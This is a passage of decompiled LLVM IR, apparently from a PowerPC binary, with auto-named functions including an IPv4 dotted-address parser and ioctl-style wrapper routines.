  %v0_10007844 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007844 = load i32, i32* @r31, align 4
  %v2_10007844 = inttoptr i32 %v1_10007844 to i32*
  store i32 %v0_10007844, i32* %v2_10007844, align 4
  %v0_10007848 = load i32, i32* %r10.global-to-local, align 4
  %v1_10007848 = load i32, i32* @r31, align 4
  %v2_10007848 = add i32 %v1_10007848, 12
  %v3_10007848 = inttoptr i32 %v2_10007848 to i32*
  store i32 %v0_10007848, i32* %v3_10007848, align 4
  %v3_1000784c = load i32, i32* @r31, align 4
  %v4_1000784c = add i32 %v3_1000784c, 16
  %v5_1000784c = inttoptr i32 %v4_1000784c to i8*
  store i8 %tmp4, i8* %v5_1000784c, align 1
  %v1_10007850 = load i32, i32* @r31, align 4
  %v2_10007850 = add i32 %v1_10007850, 52
  %v3_10007850 = inttoptr i32 %v2_10007850 to i32*
  store i32 %tmp3, i32* %v3_10007850, align 4
  %v1_10007854 = load i32, i32* @r31, align 4
  %v2_10007854 = add i32 %v1_10007854, 56
  %v3_10007854 = inttoptr i32 %v2_10007854 to i32*
  store i32 %tmp2, i32* %v3_10007854, align 4
  store i32 268466268, i32* @lr, align 4
  %v6_10007858 = sext i8 %tmp4 to i32
  %v8_10007858 = call i32 @function_1000ab14(i32 %v1_10007818, i32 %v2_1000780c, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_10007858, i32 %tmp7)
  store i32 268466280, i32* @lr, align 4
  %v3_10007864 = call i32 @function_100071a0(i32 %v8_10007858, i32 0, i32 13)
  %v0_1000786c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10007868

dec_label_pc_10007868:                            ; preds = %dec_label_pc_100077e4, %dec_label_pc_10007820
  %v0_1000786c = phi i32 [ %v3_10007808, %dec_label_pc_100077e4 ], [ %v0_1000786c.pre, %dec_label_pc_10007820 ]
  store i32 %v0_100077e8, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000786c

; uselistorder directives
  uselistorder i32 %v2_100077f8, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32 13, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10007868, { 1, 0 }
}

define i32 @function_10007880() local_unnamed_addr {
dec_label_pc_10007880:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10007888 = load i32, i32* @r4, align 4
  %v3_10007888 = icmp eq i32 %v0_10007888, 1
  %v0_10007890 = load i32, i32* @r3, align 4
  store i32 %v0_10007890, i32* @r27, align 4
  %v0_10007898 = load i32, i32* @r5, align 4
  store i32 %v0_10007898, i32* @r31, align 4
  br i1 %v3_10007888, label %dec_label_pc_100078bc, label %dec_label_pc_100078a0

dec_label_pc_100078a0:                            ; preds = %dec_label_pc_10007880
  %v3_100078a0 = icmp eq i32 %v0_10007888, 2
  br i1 %v3_100078a0, label %dec_label_pc_100078dc, label %dec_label_pc_100078a8

dec_label_pc_100078a8:                            ; preds = %dec_label_pc_100078a0
  %v3_100078a8 = icmp eq i32 %v0_10007888, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_100078a8, label %dec_label_pc_100078e4, label %dec_label_pc_100078c8

dec_label_pc_100078bc:                            ; preds = %dec_label_pc_10007880
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_100078e4

dec_label_pc_100078c8:                            ; preds = %dec_label_pc_100078a8
  %v0_100078c8 = call i32 @function_10004e38()
  store i32 -1, i32* @r28, align 4
  %v2_100078d4 = inttoptr i32 %v0_100078c8 to i32*
  store i32 22, i32* %v2_100078d4, align 4
  br label %dec_label_pc_100079cc

dec_label_pc_100078dc:                            ; preds = %dec_label_pc_100078a0
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_100078e4

dec_label_pc_100078e4:                            ; preds = %dec_label_pc_100078a8, %dec_label_pc_100078bc, %dec_label_pc_100078dc
  %v1_100078e4 = inttoptr i32 %v0_10007898 to i32*
  %v2_100078e4 = load i32, i32* %v1_100078e4, align 4
  store i32 19, i32* @r5, align 4
  %v1_100078ec = add i32 %v0_10007898, 4
  %v2_100078ec = inttoptr i32 %v1_100078ec to i32*
  %v3_100078ec = load i32, i32* %v2_100078ec, align 4
  store i32 %v3_100078ec, i32* %r9.global-to-local, align 4
  %v1_100078f0 = add i32 %v0_10007898, 17
  store i32 %v1_100078f0, i32* @r4, align 4
  %v1_100078f4 = add i32 %v0_10007898, 8
  %v2_100078f4 = inttoptr i32 %v1_100078f4 to i32*
  %v3_100078f4 = load i32, i32* %v2_100078f4, align 4
  %v2_100078f8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100078f8, i32* @r3, align 4
  %v2_10007900 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10007900, i32* @r26, align 4
  store i32 %v2_100078e4, i32* %stack_var_-72, align 4
  store i32 268466480, i32* @lr, align 4
  %v0_1000792c = call i32 @function_10007104()
  %v0_10007930 = load i32, i32* @r27, align 4
  %v0_10007934 = load i32, i32* @r30, align 4
  store i32 268466500, i32* @lr, align 4
  %v3_10007940 = call i32 @function_100049cc(i32 %v0_10007930, i32 %v0_10007934, i32 %v2_10007900)
  store i32 %v3_10007940, i32* @r28, align 4
  %v3_10007944 = icmp eq i32 %v3_10007940, 0
  br i1 %v3_10007944, label %dec_label_pc_1000794c, label %dec_label_pc_100079cc

dec_label_pc_1000794c:                            ; preds = %dec_label_pc_100078e4
  %v0_1000794c = load i32, i32* @r30, align 4
  %v3_10007950 = icmp eq i32 %v0_1000794c, -2144570348
  br i1 %v3_10007950, label %dec_label_pc_10007958, label %dec_label_pc_100079c8

dec_label_pc_10007958:                            ; preds = %dec_label_pc_1000794c
  %v0_10007958 = call i32 @function_10004e38()
  store i32 %v0_10007958, i32* @r29, align 4
  %v0_10007968 = load i32, i32* @r27, align 4
  %v1_10007970 = inttoptr i32 %v0_10007958 to i32*
  %v2_10007970 = load i32, i32* %v1_10007970, align 4
  store i32 %v2_10007970, i32* @r30, align 4
  store i32 268466556, i32* @lr, align 4
  %v3_10007978 = call i32 @function_100049cc(i32 %v0_10007968, i32 1076655123, i32 %v2_10007900)
  %v3_1000797c = icmp eq i32 %v3_10007978, 0
  br i1 %v3_1000797c, label %dec_label_pc_1000798c, label %dec_label_pc_10007984

dec_label_pc_10007984:                            ; preds = %dec_label_pc_10007958
  %v0_10007984 = load i32, i32* @r30, align 4
  %v1_10007984 = load i32, i32* @r29, align 4
  %v2_10007984 = inttoptr i32 %v1_10007984 to i32*
  store i32 %v0_10007984, i32* %v2_10007984, align 4
  br label %dec_label_pc_100079cc

dec_label_pc_1000798c:                            ; preds = %dec_label_pc_10007958
  %v0_1000798c = load i32, i32* @r31, align 4
  %v1_1000798c = add i32 %v0_1000798c, 8
  %v2_1000798c = inttoptr i32 %v1_1000798c to i32*
  %v3_1000798c = load i32, i32* %v2_1000798c, align 4
  %v1_10007994 = call i32 @__asm_rlwinm(i32 %v3_1000798c, i32 0, i32 19, i32 20)
  %v1_10007998 = call i32 @__asm_rlwinm(i32 %v3_100078f4, i32 0, i32 19, i32 20)
  store i32 %v1_10007998, i32* %r9.global-to-local, align 4
  %v4_1000799c = icmp eq i32 %v1_10007994, %v1_10007998
  br i1 %v4_1000799c, label %dec_label_pc_100079a4, label %dec_label_pc_100079b8

dec_label_pc_100079a4:                            ; preds = %dec_label_pc_1000798c
  %v1_100079a4 = and i32 %v3_1000798c, 768
  store i32 %v1_100079a4, i32* %r9.global-to-local, align 4
  %v3_100079a4 = icmp eq i32 %v1_100079a4, 0
  br i1 %v3_100079a4, label %dec_label_pc_100079c8, label %dec_label_pc_100079ac

dec_label_pc_100079ac:                            ; preds = %dec_label_pc_100079a4
  %v1_100079ac = call i32 @__asm_rlwinm(i32 %v3_100078f4, i32 0, i32 22, i32 23)
  %v0_100079b0 = load i32, i32* %r9.global-to-local, align 4
  %v4_100079b0 = icmp eq i32 %v0_100079b0, %v1_100079ac
  br i1 %v4_100079b0, label %dec_label_pc_100079c8, label %dec_label_pc_100079b8

dec_label_pc_100079b8:                            ; preds = %dec_label_pc_1000798c, %dec_label_pc_100079ac
  store i32 -1, i32* @r28, align 4
  %v1_100079c0 = load i32, i32* @r29, align 4
  %v2_100079c0 = inttoptr i32 %v1_100079c0 to i32*
  store i32 22, i32* %v2_100079c0, align 4
  br label %dec_label_pc_100079cc

dec_label_pc_100079c8:                            ; preds = %dec_label_pc_1000794c, %dec_label_pc_100079ac, %dec_label_pc_100079a4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_100079cc

dec_label_pc_100079cc:                            ; preds = %dec_label_pc_100078e4, %dec_label_pc_10007984, %dec_label_pc_100078c8, %dec_label_pc_100079b8, %dec_label_pc_100079c8
  %v0_100079d0 = load i32, i32* @r28, align 4
  ret i32 %v0_100079d0

; uselistorder directives
  uselistorder i32 %v0_10007898, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @function_100049cc, { 2, 1, 0, 3 }
  uselistorder i32 19, { 3, 4, 5, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_100079cc, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_100079c8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100079b8, { 1, 0 }
  uselistorder label %dec_label_pc_100078e4, { 2, 1, 0 }
}

define i32 @function_100079e4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100079e4:
  %v0_100079e4 = load i32, i32* @r3, align 4
  ret i32 %v0_100079e4
}

define i32 @function_100079f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100079f0:
  %v0_100079f0 = load i32, i32* @r3, align 4
  ret i32 %v0_100079f0
}

define i32 @function_100079f4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100079f4:
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr6_eq.global-to-local = alloca i1, align 1
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 0, i32* %r12.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_10007a08.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10007a08

dec_label_pc_10007a08:                            ; preds = %dec_label_pc_10007af8, %dec_label_pc_100079f4
  %v0_10007a1c = phi i32 [ %v1_10007af8, %dec_label_pc_10007af8 ], [ %v0_10007a08.pre, %dec_label_pc_100079f4 ]
  %v1_10007a08 = inttoptr i32 %v0_10007a1c to i8*
  %v2_10007a08 = load i8, i8* %v1_10007a08, align 1
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  %v3_10007a14 = icmp eq i8 %v2_10007a08, 48
  br i1 %v3_10007a14, label %dec_label_pc_10007a1c, label %dec_label_pc_10007a44

dec_label_pc_10007a1c:                            ; preds = %dec_label_pc_10007a08
  %v1_10007a1c = add i32 %v0_10007a1c, 1
  %v2_10007a1c = inttoptr i32 %v1_10007a1c to i8*
  %v3_10007a1c = load i8, i8* %v2_10007a1c, align 1
  store i32 %v1_10007a1c, i32* @r3, align 4
  %v3_10007a20 = icmp eq i8 %v3_10007a1c, 120
  br i1 %v3_10007a20, label %dec_label_pc_10007a38, label %dec_label_pc_10007a28

dec_label_pc_10007a28:                            ; preds = %dec_label_pc_10007a1c
  %v3_10007a28 = icmp eq i8 %v3_10007a1c, 88
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 8, i32* %r7.global-to-local, align 4
  br i1 %v3_10007a28, label %dec_label_pc_10007a38, label %dec_label_pc_10007a44

dec_label_pc_10007a38:                            ; preds = %dec_label_pc_10007a28, %dec_label_pc_10007a1c
  %v1_10007a38 = add i32 %v0_10007a1c, 2
  store i32 %v1_10007a38, i32* @r3, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 16, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10007a44

dec_label_pc_10007a44:                            ; preds = %dec_label_pc_10007a28, %dec_label_pc_10007a08, %dec_label_pc_10007a38
  %v0_10007ab45 = phi i32 [ %v1_10007a1c, %dec_label_pc_10007a28 ], [ %v0_10007a1c, %dec_label_pc_10007a08 ], [ %v1_10007a38, %dec_label_pc_10007a38 ]
  %v0_10007acc10 = phi i32 [ 1, %dec_label_pc_10007a28 ], [ 0, %dec_label_pc_10007a08 ], [ 0, %dec_label_pc_10007a38 ]
  %v0_10007a48 = phi i32 [ 8, %dec_label_pc_10007a28 ], [ 10, %dec_label_pc_10007a08 ], [ 16, %dec_label_pc_10007a38 ]
  %v3_10007a44 = load i32, i32* @global_var_1001044c, align 4
  store i32 %v3_10007a44, i32* %r31.global-to-local, align 4
  %v3_10007a48 = icmp eq i32 %v0_10007a48, 8
  store i1 %v3_10007a48, i1* %cr1_eq.global-to-local, align 1
  %v3_10007a4c = icmp eq i32 %v0_10007a48, 16
  store i1 %v3_10007a4c, i1* %cr6_eq.global-to-local, align 1
  store i32 0, i32* %r10.global-to-local, align 4
  %v1_10007ab418 = inttoptr i32 %v0_10007ab45 to i8*
  %v2_10007ab419 = load i8, i8* %v1_10007ab418, align 1
  %v3_10007ab420 = zext i8 %v2_10007ab419 to i32
  store i32 %v3_10007ab420, i32* %r11.global-to-local, align 4
  %v3_10007abc22 = icmp eq i8 %v2_10007ab419, 0
  store i32 %v3_10007ab420, i32* %r5.global-to-local, align 4
  br i1 %v3_10007abc22, label %dec_label_pc_10007acc, label %dec_label_pc_10007a58

dec_label_pc_10007a58:                            ; preds = %dec_label_pc_10007a44, %dec_label_pc_10007aa4.dec_label_pc_10007ab4_crit_edge.dec_label_pc_10007a58_crit_edge
  %v1_10007a58 = phi i32 [ %v1_10007a58.pre, %dec_label_pc_10007aa4.dec_label_pc_10007ab4_crit_edge.dec_label_pc_10007a58_crit_edge ], [ %v3_10007a44, %dec_label_pc_10007a44 ]
  %v1_10007ac026.in = phi i32 [ %v3_10007ab4, %dec_label_pc_10007aa4.dec_label_pc_10007ab4_crit_edge.dec_label_pc_10007a58_crit_edge ], [ %v3_10007ab420, %dec_label_pc_10007a44 ]
  %v0_10007a5c25 = phi i32 [ %v0_10007aa4, %dec_label_pc_10007aa4.dec_label_pc_10007ab4_crit_edge.dec_label_pc_10007a58_crit_edge ], [ 0, %dec_label_pc_10007a44 ]
  %v1_10007ac026 = mul nuw nsw i32 %v1_10007ac026.in, 2
  %v2_10007a58 = add i32 %v1_10007a58, %v1_10007ac026
  %v3_10007a58 = inttoptr i32 %v2_10007a58 to i16*
  %v4_10007a58 = load i16, i16* %v3_10007a58, align 2
  %v5_10007a58 = zext i16 %v4_10007a58 to i32
  %v1_10007a5c = mul i32 %v0_10007a5c25, 16
  store i32 %v1_10007a5c, i32* %r8.global-to-local, align 4
  %v1_10007a60 = call i32 @__asm_rlwinm(i32 %v5_10007a58, i32 31, i32 31, i32 31)
  %v1_10007a64 = and i32 %v5_10007a58, 8
  %v3_10007a64 = icmp eq i32 %v1_10007a64, 0
  %not.v2_10007a68 = icmp eq i32 %v1_10007a60, 0
  %v6_10007a6c = sext i1 %not.v2_10007a68 to i32
  %v1_10007a70 = call i32 @__asm_rlwinm(i32 %v6_10007a6c, i32 0, i32 26, i32 26)
  %v1_10007a74 = call i32 @__asm_rlwinm(i32 %v5_10007a58, i32 28, i32 31, i32 31)
  %v1_10007a78 = add i32 %v1_10007a70, -87
  br i1 %v3_10007a64, label %dec_label_pc_10007a98, label %dec_label_pc_10007a84

dec_label_pc_10007a84:                            ; preds = %dec_label_pc_10007a58
  %v0_10007a84 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007a84 = icmp ugt i32 %v0_10007a84, 55
  %v0_10007a88 = load i32, i32* %r5.global-to-local, align 4
  %v1_10007a88 = add i32 %v0_10007a88, -48
  store i32 %v1_10007a88, i32* %r10.global-to-local, align 4
  %v0_10007a8c = load i1, i1* %cr1_eq.global-to-local, align 1
  %brmerge13.demorgan = and i1 %v2_10007a84, %v0_10007a8c
  br i1 %brmerge13.demorgan, label %dec_label_pc_10007b08, label %dec_label_pc_10007aa4

dec_label_pc_10007a98:                            ; preds = %dec_label_pc_10007a58
  %v3_10007a7c = icmp eq i32 %v1_10007a74, 0
  %v0_10007a98 = load i1, i1* %cr6_eq.global-to-local, align 1
  %v0_10007a98.not = xor i1 %v0_10007a98, true
  %brmerge = or i1 %v3_10007a7c, %v0_10007a98.not
  br i1 %brmerge, label %dec_label_pc_10007a98.dec_label_pc_10007acc_crit_edge, label %dec_label_pc_10007aa0

dec_label_pc_10007a98.dec_label_pc_10007acc_crit_edge: ; preds = %dec_label_pc_10007a98
  %v0_10007acc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10007acc

dec_label_pc_10007aa0:                            ; preds = %dec_label_pc_10007a98
  %v0_10007aa0 = load i32, i32* %r8.global-to-local, align 4
  %v2_10007aa0 = add i32 %v0_10007aa0, %v1_10007a78
  store i32 %v2_10007aa0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007aa4

dec_label_pc_10007aa4:                            ; preds = %dec_label_pc_10007a84, %dec_label_pc_10007aa0
  %v0_10007aa4 = phi i32 [ %v1_10007a88, %dec_label_pc_10007a84 ], [ %v2_10007aa0, %dec_label_pc_10007aa0 ]
  %v2_10007aa4 = icmp ugt i32 %v0_10007aa4, 255
  %v0_10007aa8 = load i32, i32* @r3, align 4
  %v1_10007aa8 = add i32 %v0_10007aa8, 1
  store i32 %v1_10007aa8, i32* @r3, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  br i1 %v2_10007aa4, label %dec_label_pc_10007b08, label %dec_label_pc_10007aa4.dec_label_pc_10007ab4_crit_edge

dec_label_pc_10007aa4.dec_label_pc_10007ab4_crit_edge: ; preds = %dec_label_pc_10007aa4
  %v1_10007ab8.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_10007ab4 = inttoptr i32 %v1_10007aa8 to i8*
  %v2_10007ab4 = load i8, i8* %v1_10007ab4, align 1
  %v3_10007ab4 = zext i8 %v2_10007ab4 to i32
  store i32 %v3_10007ab4, i32* %r11.global-to-local, align 4
  %v2_10007ab8 = mul i32 %v0_10007aa4, %v1_10007ab8.pre
  %v3_10007abc = icmp eq i8 %v2_10007ab4, 0
  %v2_10007ac4 = add i32 %v3_10007ab4, %v2_10007ab8
  store i32 %v2_10007ac4, i32* %r5.global-to-local, align 4
  br i1 %v3_10007abc, label %dec_label_pc_10007acc.thread, label %dec_label_pc_10007aa4.dec_label_pc_10007ab4_crit_edge.dec_label_pc_10007a58_crit_edge

dec_label_pc_10007acc.thread:                     ; preds = %dec_label_pc_10007aa4.dec_label_pc_10007ab4_crit_edge
  br label %dec_label_pc_10007ad4

dec_label_pc_10007aa4.dec_label_pc_10007ab4_crit_edge.dec_label_pc_10007a58_crit_edge: ; preds = %dec_label_pc_10007aa4.dec_label_pc_10007ab4_crit_edge
  %v1_10007a58.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007a58

dec_label_pc_10007acc:                            ; preds = %dec_label_pc_10007a44, %dec_label_pc_10007a98.dec_label_pc_10007acc_crit_edge
  %v0_10007acc = phi i32 [ %v0_10007acc.pre, %dec_label_pc_10007a98.dec_label_pc_10007acc_crit_edge ], [ %v0_10007acc10, %dec_label_pc_10007a44 ]
  %v3_10007acc = icmp eq i32 %v0_10007acc, 0
  br i1 %v3_10007acc, label %dec_label_pc_10007b08, label %dec_label_pc_10007ad4

dec_label_pc_10007ad4:                            ; preds = %dec_label_pc_10007acc.thread, %dec_label_pc_10007acc
  %v0_10007ad4 = load i32, i32* %r12.global-to-local, align 4
  %v3_10007ad4 = icmp eq i32 %v0_10007ad4, 0
  %v0_10007ae4.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_10007ad4, label %dec_label_pc_10007ae0, label %dec_label_pc_10007adc

dec_label_pc_10007adc:                            ; preds = %dec_label_pc_10007ad4
  %v1_10007adc = mul i32 %v0_10007ae4.pre, 256
  store i32 %v1_10007adc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10007ae0

dec_label_pc_10007ae0:                            ; preds = %dec_label_pc_10007ad4, %dec_label_pc_10007adc
  %v0_10007ae4 = phi i32 [ %v1_10007adc, %dec_label_pc_10007adc ], [ %v0_10007ae4.pre, %dec_label_pc_10007ad4 ]
  %v0_10007ae0 = load i32, i32* %r11.global-to-local, align 4
  %v3_10007ae0 = icmp eq i32 %v0_10007ae0, 46
  %v1_10007ae4 = load i32, i32* %r10.global-to-local, align 4
  %v2_10007ae4 = or i32 %v1_10007ae4, %v0_10007ae4
  store i32 %v2_10007ae4, i32* %r4.global-to-local, align 4
  br i1 %v3_10007ae0, label %dec_label_pc_10007aec, label %dec_label_pc_10007b00

dec_label_pc_10007aec:                            ; preds = %dec_label_pc_10007ae0
  %v3_10007aec = icmp eq i32 %v0_10007ad4, 3
  %v1_10007af0 = add i32 %v0_10007ad4, 1
  store i32 %v1_10007af0, i32* %r12.global-to-local, align 4
  br i1 %v3_10007aec, label %dec_label_pc_10007b08, label %dec_label_pc_10007af8

dec_label_pc_10007af8:                            ; preds = %dec_label_pc_10007aec
  %v0_10007af8 = load i32, i32* @r3, align 4
  %v1_10007af8 = add i32 %v0_10007af8, 1
  store i32 %v1_10007af8, i32* @r3, align 4
  br label %dec_label_pc_10007a08

dec_label_pc_10007b00:                            ; preds = %dec_label_pc_10007ae0
  %v3_10007b00 = icmp eq i32 %v0_10007ae0, 0
  br i1 %v3_10007b00, label %dec_label_pc_10007b0c, label %dec_label_pc_10007b08

dec_label_pc_10007b08:                            ; preds = %dec_label_pc_10007aec, %dec_label_pc_10007acc, %dec_label_pc_10007a84, %dec_label_pc_10007aa4, %dec_label_pc_10007b00
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10007b0c

dec_label_pc_10007b0c:                            ; preds = %dec_label_pc_10007b00, %dec_label_pc_10007b08
  %v0_10007b0c = phi i32 [ %v2_10007ae4, %dec_label_pc_10007b00 ], [ -1, %dec_label_pc_10007b08 ]
  ret i32 %v0_10007b0c

; uselistorder directives
  uselistorder i32 %v1_10007af8, { 1, 0 }
  uselistorder i32 %v1_10007adc, { 1, 0 }
  uselistorder i32 %v0_10007ae4.pre, { 1, 0 }
  uselistorder i32 %v3_10007ab4, { 1, 2, 0 }
  uselistorder i32 %v0_10007aa4, { 1, 2, 0 }
  uselistorder i32 %v0_10007a48, { 1, 0 }
  uselistorder i32 %v0_10007a1c, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10007b0c, { 1, 0 }
  uselistorder label %dec_label_pc_10007b08, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10007ae0, { 1, 0 }
  uselistorder label %dec_label_pc_10007ad4, { 1, 0 }
  uselistorder label %dec_label_pc_10007acc, { 1, 0 }
  uselistorder label %dec_label_pc_10007aa4, { 1, 0 }
  uselistorder label %dec_label_pc_10007a58, { 1, 0 }
  uselistorder label %dec_label_pc_10007a44, { 2, 0, 1 }
}

define i32 @function_10007b1c(i32 %arg1) local_unnamed_addr {
dec_label_pc_10007b1c:
  %stack_var_-24 = alloca i32, align 4
  %v2_10007b24 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10007b24, i32* @r4, align 4
  store i32 268466992, i32* @lr, align 4
  %v1_10007b2c = bitcast i32* %stack_var_-24 to i8*
  %v2_10007b2c = call i32 @function_1000ad18(i8* %v1_10007b2c)
  %v3_10007b30 = icmp eq i32 %v2_10007b2c, 0
  br i1 %v3_10007b30, label %dec_label_pc_10007b40, label %dec_label_pc_10007b3c

dec_label_pc_10007b3c:                            ; preds = %dec_label_pc_10007b1c
  %v3_10007b3c = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10007b40

dec_label_pc_10007b40:                            ; preds = %dec_label_pc_10007b1c, %dec_label_pc_10007b3c
  %v0_10007b4c = phi i32 [ -1, %dec_label_pc_10007b1c ], [ %v3_10007b3c, %dec_label_pc_10007b3c ]
  ret i32 %v0_10007b4c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007b40, { 1, 0 }
}

define i32 @function_10007b50(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007b50:
  %stack_var_-40 = alloca i32, align 4
  %v0_10007b64 = call i32 @function_10009ac8()
  %v2_10007b74 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268467084, i32* @lr, align 4
  %v7_10007b88 = call i32 @function_10007ba4(i32 %arg1, i32* nonnull @global_var_10012ae0.260, i32 ptrtoint (i32* @global_var_10012914.261 to i32), i32 460, i32 %v2_10007b74, i32 %v0_10007b64)
  %v3_10007b90 = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_10007b90
}

define i32 @function_10007ba4(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10007ba4:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_10007ba8 = load i32, i32* @lr, align 4
  store i32 %v0_10007ba8, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_10007bb0 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* %r20.global-to-local, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* %r29.global-to-local, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_10007bd0 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_10007bd0, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_10007bb0, label %dec_label_pc_10007ed4, label %dec_label_pc_10007bdc

dec_label_pc_10007bdc:                            ; preds = %dec_label_pc_10007ba4
  %v0_10007bdc = call i32 @function_10004e38()
  store i32 %v0_10007bdc, i32* %r3.global-to-local, align 4
  %v1_10007be4 = inttoptr i32 %v0_10007bdc to i32*
  %v2_10007be4 = load i32, i32* %v1_10007be4, align 4
  store i32 %v2_10007be4, i32* @r27, align 4
  store i32 %v0_10007bdc, i32* %r28.global-to-local, align 4
  %v0_10007bec = load i32, i32* @r31, align 4
  store i32 %v0_10007bec, i32* %v1_10007be4, align 4
  %v0_10007bf0 = load i32, i32* %r26.global-to-local, align 4
  %v0_10007bf4 = load i32, i32* @r23, align 4
  store i32 %v0_10007bf4, i32* %r3.global-to-local, align 4
  %v0_10007bf8 = load i32, i32* %r30.global-to-local, align 4
  %v0_10007bfc = load i32, i32* %r29.global-to-local, align 4
  %v0_10007c00 = load i32, i32* %r20.global-to-local, align 4
  %v0_10007c04 = load i32, i32* @r24, align 4
  store i32 268467212, i32* @lr, align 4
  %v7_10007c08 = call i32 @function_1000b748(i32 %v0_10007bf4, i32 2, i32 %v0_10007bf0, i32 %v0_10007bf8, i32 %v0_10007bfc, i32 %v0_10007c00, i32 %v0_10007c04)
  store i32 %v7_10007c08, i32* %r3.global-to-local, align 4
  %v3_10007c0c = icmp eq i32 %v7_10007c08, 0
  br i1 %v3_10007c0c, label %dec_label_pc_10007ed4, label %dec_label_pc_10007c14

dec_label_pc_10007c14:                            ; preds = %dec_label_pc_10007bdc
  %v0_10007c14 = load i32, i32* @r24, align 4
  %v1_10007c14 = inttoptr i32 %v0_10007c14 to i32*
  %v2_10007c14 = load i32, i32* %v1_10007c14, align 4
  store i32 %v2_10007c14, i32* %r0.global-to-local, align 4
  %v3_10007c18 = icmp eq i32 %v2_10007c14, 1
  br i1 %v3_10007c18, label %dec_label_pc_10007c3c, label %dec_label_pc_10007c20

dec_label_pc_10007c20:                            ; preds = %dec_label_pc_10007c14
  %v3_10007c20 = icmp eq i32 %v2_10007c14, 4
  br i1 %v3_10007c20, label %dec_label_pc_10007c3c, label %dec_label_pc_10007c28

dec_label_pc_10007c28:                            ; preds = %dec_label_pc_10007c20
  %v3_10007c28 = icmp eq i32 %v2_10007c14, -1
  br i1 %v3_10007c28, label %dec_label_pc_10007c30, label %dec_label_pc_10007ed4

dec_label_pc_10007c30:                            ; preds = %dec_label_pc_10007c28
  %v0_10007c30 = load i32, i32* @r28, align 4
